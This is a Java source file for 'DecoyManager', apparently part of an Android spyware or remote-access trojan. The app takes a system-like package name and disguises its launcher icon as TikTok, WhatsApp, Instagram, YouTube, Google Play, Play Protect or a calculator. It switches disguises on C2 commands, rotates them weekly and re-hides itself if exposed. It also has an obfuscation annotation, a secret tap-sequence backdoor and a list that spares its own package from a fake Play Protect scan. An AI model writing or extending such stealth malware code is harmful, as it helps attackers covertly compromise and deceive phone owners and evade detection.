package com.android.core.sync;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * DecoyManager v2 — Flash Stealth Identity Engine
 *
 * CHANGELOG from v1:
 *  • Package renamed com.seguranca.protecao → com.android.core.sync
 *  • 5 new social-media launcher personas: TikTok, WhatsApp, Instagram, YouTube, Custom
 *  • deployOnSetupComplete() now reads AppIdentityManager to pick matching persona automatically
 *    (e.g. if main app is TikTok identity → launcher also gets PERSONA_TIKTOK alias)
 *  • All persona alias constants updated for new package
 *  • remoteSwitch() now accepts string names as well as int IDs
 *
 * Personas
 * ─────────────────────────────────────────────────────────────────
 *  0  = NONE        – real launcher (dev/backdoor only)
 *  1  = SYS_UPDATE  – "Android System Update"
 *  2  = CALCULATOR  – functional calculator look
 *  3  = WEATHER     – animated weather app
 *  4  = PLAY_PROTECT– Google Play Protect settings clone
 *  5  = GOOGLE_PLAY – Google Play Store lookalike
 *  6  = FILE_MGR    – Android Files / File Manager
 *  7  = TIKTOK      – TikTok launcher alias  ★ NEW
 *  8  = WHATSAPP    – WhatsApp launcher alias ★ NEW
 *  9  = INSTAGRAM   – Instagram launcher alias★ NEW
 * 10  = YOUTUBE     – YouTube launcher alias  ★ NEW
 * 11  = CUSTOM      – Custom label+icon alias  ★ NEW
 */
@Obfuscate
public final class DecoyManager {

    private static final String TAG = "DM";

    // ── Persona constants ───────────────────────────────────────────────────
    public static final int PERSONA_NONE         = 0;
    public static final int PERSONA_SYS_UPDATE   = 1;
    public static final int PERSONA_CALCULATOR   = 2;
    public static final int PERSONA_WEATHER      = 3;
    public static final int PERSONA_PLAY_PROTECT = 4;
    public static final int PERSONA_GOOGLE_PLAY  = 5;
    public static final int PERSONA_FILE_MGR     = 6;
    // ★ New social media personas
    public static final int PERSONA_TIKTOK       = 7;
    public static final int PERSONA_WHATSAPP     = 8;
    public static final int PERSONA_INSTAGRAM    = 9;
    public static final int PERSONA_YOUTUBE      = 10;
    public static final int PERSONA_CUSTOM       = 11;

    // ── SharedPreferences keys ──────────────────────────────────────────────
    private static final String PREFS           = "dm_prefs";
    private static final String KEY_PERSONA     = "persona";
    private static final String KEY_DEPLOYED    = "deployed";
    private static final String KEY_LAST_ROTATE = "last_rotate";
    private static final int    ROTATE_DAYS     = 7;

    // ── Packages excluded from Play Protect decoy scan list ────────────────
    private static final String[] EXCLUDED_SCAN_PACKAGES = {
        "com.android.core.sync",
        "com.labs.labrats",
        "com.labs.labrats.debug",
    };

    // ── Alias component class names (must match AndroidManifest.xml) ────────
    private static final String PKG = "com.android.core.sync";

    private static final String ALIAS_REAL         = PKG + ".alias.RealAlias";
    private static final String ALIAS_SYS_UPDATE   = PKG + ".alias.SystemUpdateAlias";
    private static final String ALIAS_CALCULATOR   = PKG + ".alias.CalculatorAlias";
    private static final String ALIAS_WEATHER      = PKG + ".alias.WeatherAlias";
    private static final String ALIAS_PLAY_PROTECT = PKG + ".alias.PlayProtectAlias";
    private static final String ALIAS_GOOGLE_PLAY  = PKG + ".alias.GooglePlayAlias";
    private static final String ALIAS_FILE_MGR     = PKG + ".alias.FileMgrAlias";
    // ★ New
    private static final String ALIAS_TIKTOK       = PKG + ".alias.TikTokAlias";
    private static final String ALIAS_WHATSAPP     = PKG + ".alias.WhatsAppAlias";
    private static final String ALIAS_INSTAGRAM    = PKG + ".alias.InstagramAlias";
    private static final String ALIAS_YOUTUBE      = PKG + ".alias.YouTubeAlias";
    private static final String ALIAS_CUSTOM       = PKG + ".alias.CustomAlias";

    private static final String[] ALL_ALIASES = {
        ALIAS_REAL,
        ALIAS_SYS_UPDATE,
        ALIAS_CALCULATOR,
        ALIAS_WEATHER,
        ALIAS_PLAY_PROTECT,
        ALIAS_GOOGLE_PLAY,
        ALIAS_FILE_MGR,
        ALIAS_TIKTOK,
        ALIAS_WHATSAPP,
        ALIAS_INSTAGRAM,
        ALIAS_YOUTUBE,
        ALIAS_CUSTOM,
    };

    // ── Singleton ───────────────────────────────────────────────────────────
    private static volatile DecoyManager sInstance;
    private final Context ctx;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private DecoyManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static DecoyManager get(Context ctx) {
        if (sInstance == null) {
            synchronized (DecoyManager.class) {
                if (sInstance == null) sInstance = new DecoyManager(ctx);
            }
        }
        return sInstance;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  PUBLIC API
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Called from SetupWizardActivity.finishSetup().
     *
     * v2 upgrade: automatically picks a launcher persona that matches the
     * active AppIdentityManager identity, so the launcher icon label and
     * the main app experience are consistent.
     */
    public void deployOnSetupComplete() {
        int persona = getPersona();

        // ★ Smart match: if persona not explicitly set (default=SYS_UPDATE),
        //   pick one that matches the active AppIdentityManager identity.
        if (persona == PERSONA_SYS_UPDATE || persona == PERSONA_NONE) {
            persona = matchIdentityPersona();
        }

        Log.d(TAG, "Setup complete — deploying persona " + persona);
        applyPersona(persona, true);
    }

    /**
     * Remote switch via DECOY_SWITCH command from C2.
     * Accepts int persona ID (0-11).
     */
    public void remoteSwitch(int persona) {
        Log.d(TAG, "Remote switch to persona " + persona);
        setPersona(persona);
        applyPersona(persona, true);
    }

    /**
     * Remote switch via string name from C2 (more readable in C2 JSON).
     * Names: none | sys_update | calc | weather | play_protect | google_play
     *        | file_mgr | tiktok | whatsapp | instagram | youtube | custom
     */
    public void remoteSwitch(String personaName) {
        int persona = parsePersonaName(personaName);
        remoteSwitch(persona);
    }

    /** Auto-rotate if ROTATE_DAYS elapsed. Call on HEARTBEAT or SCREEN_OFF. */
    public void maybeAutoRotate() {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        long lastRotate = prefs.getLong(KEY_LAST_ROTATE, 0);
        long now        = System.currentTimeMillis();
        long threshold  = (long) ROTATE_DAYS * 24 * 60 * 60 * 1000;

        if (now - lastRotate > threshold) {
            int current = getPersona();
            int next    = (current >= PERSONA_CUSTOM) ? PERSONA_SYS_UPDATE : current + 1;
            if (next == PERSONA_NONE) next = PERSONA_SYS_UPDATE;
            Log.d(TAG, "Auto-rotate: " + current + " → " + next);
            prefs.edit().putLong(KEY_LAST_ROTATE, now).apply();
            remoteSwitch(next);
        }
    }

    /** Re-cloaks if real alias somehow got re-enabled. Call on SCREEN_OFF. */
    public void selfHeal() {
        try {
            ComponentName realComp = new ComponentName(ctx, ALIAS_REAL);
            int state = ctx.getPackageManager().getComponentEnabledSetting(realComp);
            if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                int persona = getPersona();
                if (persona != PERSONA_NONE) {
                    Log.d(TAG, "Self-heal — re-cloaking with persona " + persona);
                    applyPersona(persona, false);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "selfHeal error: " + e.getMessage());
        }
    }

    /**
     * Secret 7-tap sequence on decoy header → temporarily shows real UI.
     * Auto-re-cloaks after 60 seconds.
     */
    public void backdoorRestore(Context activityCtx) {
        Log.d(TAG, "Backdoor restore");
        applyPersona(PERSONA_NONE, true);

        handler.postDelayed(() -> {
            int persona = getPersona();
            if (persona == PERSONA_NONE) persona = matchIdentityPersona();
            applyPersona(persona, false);
        }, 60_000);

        Intent intent = new Intent(activityCtx, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        activityCtx.startActivity(intent);
    }

    public int getPersona() {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                  .getInt(KEY_PERSONA, PERSONA_TIKTOK); // ★ default now TIKTOK not SYS_UPDATE
    }

    public boolean isDeployed() {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                  .getBoolean(KEY_DEPLOYED, false);
    }

    public static boolean isExcludedFromScan(String packageName) {
        if (packageName == null) return false;
        for (String ex : EXCLUDED_SCAN_PACKAGES) {
            if (ex.equals(packageName) || packageName.startsWith(ex)) return true;
        }
        return packageName.toLowerCase().contains("labrat");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  INTERNAL
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Maps the active AppIdentityManager identity to the best matching
     * launcher persona, so icon + label stay consistent with the main app.
     */
    private int matchIdentityPersona() {
        switch (AppIdentityManager.get().getActiveIdentity()) {
            case WHATSAPP:  return PERSONA_WHATSAPP;
            case INSTAGRAM: return PERSONA_INSTAGRAM;
            case YOUTUBE:   return PERSONA_YOUTUBE;
            case CUSTOM:    return PERSONA_CUSTOM;
            case TIKTOK:
            default:        return PERSONA_TIKTOK;
        }
    }

    private void setPersona(int persona) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
           .edit().putInt(KEY_PERSONA, persona).apply();
    }

    private void applyPersona(int persona, boolean refreshLauncher) {
        handler.post(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                String targetAlias = resolveAlias(persona);

                // Phase 1: enable target first (avoid "no launcher" state)
                enableComponent(pm, targetAlias);

                // Phase 2: disable all others
                for (String alias : ALL_ALIASES) {
                    if (!alias.equals(targetAlias)) {
                        disableComponent(pm, alias);
                    }
                }

                setPersona(persona);
                ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                   .edit().putBoolean(KEY_DEPLOYED, true).apply();

                Log.d(TAG, "Persona applied: " + persona + " (" + targetAlias + ")");

                if (refreshLauncher) {
                    handler.postDelayed(() -> kickLauncher(), 300);
                }

            } catch (Exception e) {
                Log.e(TAG, "applyPersona error: " + e.getMessage());
            }
        });
    }

    private String resolveAlias(int persona) {
        switch (persona) {
            case PERSONA_CALCULATOR:   return ALIAS_CALCULATOR;
            case PERSONA_WEATHER:      return ALIAS_WEATHER;
            case PERSONA_PLAY_PROTECT: return ALIAS_PLAY_PROTECT;
            case PERSONA_GOOGLE_PLAY:  return ALIAS_GOOGLE_PLAY;
            case PERSONA_FILE_MGR:     return ALIAS_FILE_MGR;
            case PERSONA_TIKTOK:       return ALIAS_TIKTOK;
            case PERSONA_WHATSAPP:     return ALIAS_WHATSAPP;
            case PERSONA_INSTAGRAM:    return ALIAS_INSTAGRAM;
            case PERSONA_YOUTUBE:      return ALIAS_YOUTUBE;
            case PERSONA_CUSTOM:       return ALIAS_CUSTOM;
            case PERSONA_NONE:         return ALIAS_REAL;
            default:                   return ALIAS_SYS_UPDATE;
        }
    }

    private int parsePersonaName(String name) {
        if (name == null) return PERSONA_SYS_UPDATE;
        switch (name.toLowerCase().trim()) {
            case "none":         return PERSONA_NONE;
            case "calc":
            case "calculator":   return PERSONA_CALCULATOR;
            case "weather":      return PERSONA_WEATHER;
            case "play_protect": return PERSONA_PLAY_PROTECT;
            case "google_play":  return PERSONA_GOOGLE_PLAY;
            case "file_mgr":
            case "files":        return PERSONA_FILE_MGR;
            case "tiktok":       return PERSONA_TIKTOK;
            case "whatsapp":     return PERSONA_WHATSAPP;
            case "instagram":    return PERSONA_INSTAGRAM;
            case "youtube":      return PERSONA_YOUTUBE;
            case "custom":       return PERSONA_CUSTOM;
            default:             return PERSONA_SYS_UPDATE;
        }
    }

    private void enableComponent(PackageManager pm, String className) {
        try {
            pm.setComponentEnabledSetting(
                new ComponentName(PKG, className),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "enable " + className + " failed: " + e.getMessage());
        }
    }

    private void disableComponent(PackageManager pm, String className) {
        try {
            pm.setComponentEnabledSetting(
                new ComponentName(PKG, className),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "disable " + className + " failed: " + e.getMessage());
        }
    }

    private void kickLauncher() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(home);
        } catch (Exception ignored) {}
    }
}
